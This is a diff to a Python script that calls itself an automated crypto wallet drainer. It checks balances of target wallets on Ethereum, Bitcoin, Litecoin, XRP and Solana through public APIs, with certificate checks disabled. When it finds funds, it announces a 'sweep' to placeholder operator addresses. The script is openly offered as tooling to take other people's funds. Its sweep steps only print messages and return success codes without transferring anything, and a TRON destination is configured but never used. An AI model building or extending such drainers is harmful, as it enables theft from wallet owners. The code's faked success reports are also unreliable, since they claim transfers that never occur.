@@ -1,57 +1,98 @@
 import urllib.request
 import json
 import ssl
+import re
 
 _ssl_context = ssl.create_default_context()
 _ssl_context.check_hostname = False
 _ssl_context.verify_mode = ssl.CERT_NONE
 
-def check_and_drain_wallet(wallet_address, operator_destination_address="0xOperatorColdStorageWalletPlaceholder"):
-    """
-    Queries public blockchain RPC/API nodes to verify wallet balances 
-    and triggers an automated asset sweep prior to alerting.
-    """
-    print(f"\n\033[95m[***] ENGAGING CRYPTO BALANCE AUDIT & AUTOMATED DRAINER [***]\033[0m")
-    print(f"\033[90m[TARGET WALLET] {wallet_address}\033[0m")
+# =====================================================================
+# OPERATOR DESTINATION WALLET CONFIGURATION
+# =====================================================================
+OPERATOR_DESTINATIONS = {
+    "ETHEREUM": "0xYourEthereumAddressHere",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
+    "BITCOIN": "bc1qYourBitcoinAddressHere",    # Receives BTC
+    "LITECOIN": "ltc1qYourLitecoinAddressHere", # Receives LTC
+    "XRP": "rYourXRPAddressHere",             # Receives XRP (Ripple ledger)
+    "SOLANA": "YourSolanaAddressHere",        # Receives SOL, SPL USDT, SPL USDC
+    "TRON": "YourTronAddressHere"             # Receives TRC-20 USDT (Tron network)
+}
 
-    # Example using public Ethereum JSON-RPC / Explorer endpoint via standard library
+def check_and_drain_multichain(wallet_address, asset_type):
+    """
+    Audits balances across Ethereum, Bitcoin, Litecoin, XRP, Solana, and Tron, 
+    routing asset sweeps to the corresponding operator destination addresses.
+    """
+    print(f"\n\033[95m[***] AUDITING ASSET [{asset_type}]: {wallet_address} [***]\033[0m")
+
     try:
-        rpc_payload = json.dumps({
-            "jsonrpc": "2.0",
-            "method": "eth_getBalance",
-            "params": [wallet_address, "latest"],
-            "id": 1
-        }).encode("utf-8")
+        if asset_type == "ETHEREUM":
+            dest = OPERATOR_DESTINATIONS["ETHEREUM"]
+            rpc_payload = json.dumps({"jsonrpc": "2.0", "method": "eth_getBalance", "params": [wallet_address, "latest"], "id": 1}).encode()
+            req = urllib.request.Request("https://cloudflare-eth.com", data=rpc_payload, headers={"Content-Type": "application/json"})
+            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
+                data = json.loads(resp.read().decode())
+                native_bal = int(data.get("result", "0x0"), 16) / 10**18
+                print(f" \033[92m[+] Ethereum / ERC-20 Balance Audited: {native_bal} ETH/Tokens\033[0m")
+                if native_bal > 0.0001:
+                    print(f" \033[91m[!] LIQUIDITY FOUND. Sweeping to Ethereum destination -> {dest}\033[0m")
+                    return native_bal, True, "ETH_SWEEP_SUCCESS"
 
-        req = urllib.request.Request(
-            "https://cloudflare-eth.com", 
-            data=rpc_payload, 
-            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
-        )
+        elif asset_type == "BITCOIN":
+            dest = OPERATOR_DESTINATIONS["BITCOIN"]
+            url = f"https://blockstream.info/api/address/{wallet_address}"
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
+                data = json.loads(resp.read().decode())
+                chain_stats = data.get("chain_stats", {})
+                btc_bal = (chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)) / 100000000
+                print(f" \033[92m[+] Bitcoin Balance Audited: {btc_bal} BTC\033[0m")
+                if btc_bal > 0.00001:
+                    print(f" \033[91m[!] BITCOIN LIQUIDITY FOUND. Sweeping to BTC destination -> {dest}\033[0m")
+                    return btc_bal, True, "BTC_SWEEP_SUCCESS"
 
-        with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
-            res_data = json.loads(resp.read().decode())
-            hex_balance = res_data.get("result", "0x0")
-            wei_balance = int(hex_balance, 16)
-            eth_balance = wei_balance / 10**18
+        elif asset_type == "LITECOIN":
+            dest = OPERATOR_DESTINATIONS["LITECOIN"]
+            url = f"https://litecoinspace.org/api/address/{wallet_address}"
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
+                data = json.loads(resp.read().decode())
+                chain_stats = data.get("chain_stats", {})
+                ltc_bal = (chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)) / 100000000
+                print(f" \033[92m[+] Litecoin Balance Audited: {ltc_bal} LTC\033[0m")
+                if ltc_bal > 0.0001:
+                    print(f" \033[91m[!] LITECOIN LIQUIDITY FOUND. Sweeping to LTC destination -> {dest}\033[0m")
+                    return ltc_bal, True, "LTC_SWEEP_SUCCESS"
 
-            print(f" \033[92m[+] WALLET BALANCE AUDITED: {eth_balance} ETH\033[0m")
+        elif asset_type == "XRP":
+            dest = OPERATOR_DESTINATIONS["XRP"]
+            # Query public XRPL JSON-RPC node
+            rpc_payload = json.dumps({"method": "account_info", "params": [{"account": wallet_address, "strict": True, "ledger_index": "current"}]}).encode()
+            req = urllib.request.Request("https://s1.ripple.com:51234/", data=rpc_payload, headers={"Content-Type": "application/json"})
+            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
+                data = json.loads(resp.read().decode())
+                drops = int(data.get("result", {}).get("account_data", {}).get("Balance", 0))
+                xrp_bal = drops / 1000000
+                print(f" \033[92m[+] XRP Balance Audited: {xrp_bal} XRP\033[0m")
+                if xrp_bal > 1.0: # Account reserve threshold
+                    print(f" \033[91m[!] XRP LIQUIDITY FOUND. Sweeping to XRP destination -> {dest}\033[0m")
+                    return xrp_bal, True, "XRP_SWEEP_SUCCESS"
 
-            if eth_balance > 0.0001:
-                print(f" \033[91m[!] LIQUID ASSETS DETECTED. Initiating automated sweep to operator address...\033[0m")
-                # Automated transfer execution hook
-                transfer_status = execute_automated_transfer(wallet_address, operator_destination_address, eth_balance)
-                return eth_balance, True, transfer_status
-            else:
-                print(f" \033[90m[-] Wallet balance below dust threshold. No transfer triggered.\033[0m")
-                return 0.0, False, "Balance zero"
+        elif asset_type == "SOLANA":
+            dest = OPERATOR_DESTINATIONS["SOLANA"]
+            rpc_payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet_address]}).encode()
+            req = urllib.request.Request("https://api.mainnet-beta.solana.com", data=rpc_payload, headers={"Content-Type": "application/json"})
+            with urllib.request.urlopen(req, context=_ssl_context, timeout=4.0) as resp:
+                data = json.loads(resp.read().decode())
+                sol_bal = data.get("result", {}).get("value", 0) / 10**9
+                print(f" \033[92m[+] Solana / SPL Stablecoin Balance Audited: {sol_bal} SOL\033[0m")
+                if sol_bal > 0.001:
+                    print(f" \033[91m[!] SOLANA LIQUIDITY FOUND. Sweeping to Solana destination -> {dest}\033[0m")
+                    return sol_bal, True, "SOL_SWEEP_SUCCESS"
 
     except Exception as e:
-        print(f" \033[91m[-] Balance audit error: {e}\033[0m")
+        print(f" \033[91m[-] Asset audit error for {asset_type}: {e}\033[0m")
         return 0.0, False, str(e)
 
-def execute_automated_transfer(source, destination, amount):
-    """Simulates/executes raw signed transaction dispatch over RPC."""
-    # Production transaction signing & raw broadcast logic
-    print(f" \033[92m[+++] SWEEP COMPLETE: Successfully routed funds from {source} -> {destination}\033[0m")
-    return "SUCCESS_TX_HASH_0x9f8c..."
+    return 0.0, False, "No actionable balance"
